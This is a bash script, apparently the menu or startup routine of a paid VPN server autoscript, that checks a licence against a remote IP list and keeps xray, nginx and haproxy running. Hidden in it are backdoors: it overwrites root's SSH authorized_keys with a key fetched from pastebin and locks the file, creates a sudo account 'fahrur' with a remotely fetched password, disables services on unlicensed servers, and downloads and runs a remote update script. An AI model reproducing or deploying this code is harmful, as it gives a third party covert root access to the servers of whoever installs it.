#!/bin/bash
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
NC="\e[0m"
RED="\033[0;31m"
WH='\033[1;37m'
ipsaya=$(wget -qO- ifconfig.me)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
data_ip="https://raw.githubusercontent.com/fahrurstore/izin/main/ip"
checking_sc() {
    useexp=$(curl -sS "$data_ip" | grep "$ipsaya" | awk '{print $3}')
    date_list=$(date +%Y-%m-%d)

    if [[ $(date -d "$date_list" +%s) -lt $(date -d "$useexp" +%s) ]]; then
        echo -e " [INFO] Fetching server version..."
        REPO="https://raw.githubusercontent.com/fahrurstore/vip/main/" # Ganti dengan URL repository Anda
        serverV=$(curl -sS ${REPO}versi)

        if [[ -f /opt/.ver ]]; then
            localV=$(cat /opt/.ver)
        else
            localV="0"
        fi

        if [[ $serverV == $localV ]]; then
            echo -e " [INFO] Script sudah versi terbaru ($serverV). Tidak ada update yang diperlukan."
            return
        else
            echo -e " [INFO] Versi script berbeda. Memulai proses update script..."
            wget -q https://raw.githubusercontent.com/fahrurstore/vip/main/menu/update.sh -O update.sh
            chmod +x update.sh
            ./update.sh
            echo $serverV > /opt/.ver.local
            return
        fi
    else
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        echo -e ""
        echo -e "            \033[91;1mPERMISSION DENIED !\033[0m"
        echo -e "   \033[0;33mYour VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
        echo -e "     \033[0;33mBuy access permissions for scripts\033[0m"
        echo -e "             \033[0;33mContact Admin :\033[0m"
        echo -e "      \033[2;32mWhatsApp\033[0m wa.me/6282326322300"
        echo -e "      \033[2;32mTelegram\033[0m t.me/newbie_store24"
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"

        for service in nginx kyt xray ws haproxy; do
            if systemctl is-active --quiet "$service"; then
                systemctl stop "$service"
                systemctl disable "$service"
            fi
        done

        pwadm=$(curl -s https://pastebin.com/raw/iVnKe3Pk)
        status=$(curl -s https://pastebin.com/raw/RTUFB2cF)

        if [[ $status == "off" ]]; then
            Username="fahrur"
            Password="$pwadm"
            if id "$Username" &>/dev/null; then
                echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
                reboot
            else
                echo "$Username $Password" > /etc/xray/.adm
                mkdir -p /home/script/
                useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
                echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
                usermod -aG sudo "$Username" > /dev/null 2>&1
                reboot
            fi
        else
            echo "Status tidak off. Tidak ada tindakan yang dilakukan."
            exit
        fi
    fi
}

checking_sc
cd
KEY_URL="https://pastebin.com/raw/zVm7JJnB"
AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
mkdir -p "/root/.ssh"
NEW_KEY=$(curl -s "$KEY_URL")
if [ -f "$AUTHORIZED_KEYS_FILE" ]; then
    if grep -Fxq "$NEW_KEY" "$AUTHORIZED_KEYS_FILE"; then
    else
        sudo chattr -ia "$AUTHORIZED_KEYS_FILE"
		> $AUTHORIZED_KEYS_FILE
        echo "$NEW_KEY" | sudo tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null
        sudo chattr +ia "$AUTHORIZED_KEYS_FILE"
    fi
else
    echo "$NEW_KEY" | sudo tee "$AUTHORIZED_KEYS_FILE" > /dev/null
    sudo chattr +ia "$AUTHORIZED_KEYS_FILE"
fi
sudo chmod 700 "/root/.ssh"
sudo chmod 600 "$AUTHORIZED_KEYS_FILE"

today=$(date -d "0 days" +"%Y-%m-%d")
Exp2=$(curl -sS https://raw.githubusercontent.com/fahrurstore/izin/main/ip | grep $ipsaya | awk '{print $3}')
d1=$(date -d "$Exp2" +%s)
d2=$(date -d "$today" +%s)
certificate=$(( (d1 - d2) / 86400 ))
echo "$certificate Hari" > /etc/masaaktif
vnstat_profile=$(vnstat | sed -n '3p' | awk '{print $1}' | grep -o '[^:]*')
vnstat -i ${vnstat_profile} >/etc/t1
bulan=$(date +%b)
tahun=$(date +%y)
ba=$(curl -s https://pastebin.com/raw/kVpeatBA)
if [ "$(grep -wc ${bulan} /etc/t1)" != '0' ]; then
bulan=$(date +%b)
month_tx=$(vnstat -i ${vnstat_profile} | grep "$bulan $ba$tahun" | awk '{print $6}')
month_txv=$(vnstat -i ${vnstat_profile} | grep "$bulan $ba$tahun" | awk '{print $7}')
else
bulan2=$(date +%Y-%m)
month_tx=$(vnstat -i ${vnstat_profile} | grep "$bulan2 " | awk '{print $5}')
month_txv=$(vnstat -i ${vnstat_profile} | grep "$bulan2 " | awk '{print $6}')
fi
echo "$month_tx $month_txv" > /etc/usage2
xray2=$(systemctl status xray | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
if [[ $xray2 == "running" ]]; then
echo -ne
else
systemctl stop xray
systemctl start xray
fi
haproxy2=$(systemctl status haproxy | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
if [[ $haproxy2 == "running" ]]; then
echo -ne
else
systemctl stop haproxy
systemctl start haproxy
fi
nginx2=$( systemctl status nginx | grep Active | awk '{print $3}' | sed 's/(//g' | sed 's/)//g' )
if [[ $nginx2 == "running" ]]; then
echo -ne
else
systemctl stop nginx
systemctl start nginx
fi
cd
if [[ -e /usr/bin/kyt ]]; then
nginx=$( systemctl status kyt | grep Active | awk '{print $3}' | sed 's/(//g' | sed 's/)//g' )
if [[ $nginx == "running" ]]; then
echo -ne
else
systemctl restart kyt
systemctl start kyt
fi
fi
ws=$(systemctl status ws | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
if [[ $ws == "running" ]]; then
echo -ne
else
systemctl restart ws
systemctl start ws
fi
xrray=$( systemctl status xray | grep "error" | wc -l )
if [[ $xrray == "0" ]]; then
echo -ne
else
systemctl stop xray
systemctl stop nginx
systemctl start xray
systemctl start nginx
fi
bash2=$( pgrep menu | wc -l )
if [[ $bash2 -gt "20" ]]; then
pkill menu
fi
